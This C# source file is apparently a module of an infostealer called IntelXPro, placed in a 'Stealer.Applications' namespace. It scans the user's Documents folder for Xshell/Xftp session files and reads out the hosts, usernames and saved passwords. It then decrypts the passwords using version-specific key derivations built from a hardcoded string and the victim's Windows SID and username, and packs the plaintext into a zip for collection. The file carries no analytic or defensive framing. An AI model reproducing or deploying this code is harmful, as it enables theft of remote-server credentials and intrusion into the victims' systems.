using IntelXPro.src.IntelXPro.Dependencies.Data;
using IntelXPro.src.IntelXPro.Dependencies.Encryption;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class Xmanager : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            WindowsIdentity current = WindowsIdentity.GetCurrent();
            string sid = current.User.ToString();
            DirectoryInfo root = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.Personal));
            List<string> source = Search(root);
            ConcurrentBag<string> lines = new ConcurrentBag<string>();
            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "Xmanager";
            Parallel.ForEach(source, delegate (string sessionFile)
            {
                List<string> list = ReadConfigFile(sessionFile);
                if (list.Count >= 4)
                {
                    string text2 = list[0]?.Trim() ?? "";
                    string text3 = list[1] ?? "";
                    string text4 = list[2] ?? "";
                    string text5 = list[3] ?? "";
                    string text6 = "  Version : " + text2 + "\n";
                    text6 = text6 + "  Host    : " + text3 + "\n";
                    text6 = text6 + "  User    : " + text4 + "\n";
                    text6 = text6 + "  RawPass : " + text5 + "\n";
                    string text7 = DecryptToString(text4, sid, text5, text2);
                    text6 = text6 + "  Decrypted: " + text7 + "\n\n";
                    lines.Add(text6);
                    counterApplications.Files.Add(sessionFile + " => Xmanager\\sessions.txt");
                }
            });
            if (lines.Any())
            {
                string text = "Xmanager\\sessions.txt";
                zip.AddTextFile(text, string.Concat(lines));
                counterApplications.Files.Add(text);
                counter.Applications.Add(counterApplications);
            }
        }

        private List<string> Search(DirectoryInfo root)
        {
            List<string> list = new List<string>();
            if (!root.Exists)
            {
                return list;
            }
            Stack<DirectoryInfo> stack = new Stack<DirectoryInfo>();
            stack.Push(root);
            while (stack.Count > 0)
            {
                DirectoryInfo directoryInfo = stack.Pop();
                try
                {
                    FileInfo[] files = directoryInfo.GetFiles();
                    for (int i = 0; i < files.Length; i++)
                    {
                        string fullName = files[i].FullName;
                        if (fullName.EndsWith(".xsh", StringComparison.OrdinalIgnoreCase) || fullName.EndsWith(".xfp", StringComparison.OrdinalIgnoreCase))
                        {
                            list.Add(fullName);
                        }
                    }
                    DirectoryInfo[] directories = directoryInfo.GetDirectories();
                    foreach (DirectoryInfo item in directories)
                    {
                        stack.Push(item);
                    }
                }
                catch
                {
                }
            }
            return list;
        }

        private List<string> ReadConfigFile(string path)
        {
            string input = File.ReadAllText(path);
            string value = Regex.Match(input, "Version=(.*)", RegexOptions.Multiline).Groups[1].Value;
            string value2 = Regex.Match(input, "Host=(.*)", RegexOptions.Multiline).Groups[1].Value;
            string value3 = Regex.Match(input, "UserName=(.*)", RegexOptions.Multiline).Groups[1].Value;
            string value4 = Regex.Match(input, "Password=(.*)", RegexOptions.Multiline).Groups[1].Value;
            List<string> list = new List<string> { value, value2, value3 };
            if (!string.IsNullOrEmpty(value4) && value4.Length > 3)
            {
                list.Add(value4);
            }
            return list;
        }

        private string DecryptToString(string username, string sid, string rawPass, string ver)
        {
            byte[] array = Convert.FromBase64String(rawPass);
            byte[] key;
            if (ver.StartsWith("5.0") || ver.StartsWith("4") || ver.StartsWith("3") || ver.StartsWith("2"))
            {
                key = new SHA256Managed().ComputeHash(Encoding.ASCII.GetBytes("!X@s#h$e%l^l&"));
            }
            else if (ver.StartsWith("5.1") || ver.StartsWith("5.2"))
            {
                key = new SHA256Managed().ComputeHash(Encoding.ASCII.GetBytes(sid));
            }
            else if (ver.StartsWith("5") || ver.StartsWith("6") || ver.StartsWith("7.0"))
            {
                key = new SHA256Managed().ComputeHash(Encoding.ASCII.GetBytes(username + sid));
            }
            else
            {
                string s = new string((new string(username.ToCharArray().Reverse().ToArray()) + sid).ToCharArray().Reverse().ToArray());
                key = new SHA256Managed().ComputeHash(Encoding.ASCII.GetBytes(s));
            }
            byte[] array2 = new byte[array.Length - 32];
            Array.Copy(array, 0, array2, 0, array2.Length);
            byte[] array3 = RC4Crypt.Decrypt(key, array2);
            if (array3 == null)
            {
                return string.Empty;
            }
            return Encoding.ASCII.GetString(array3);
        }
    }
}
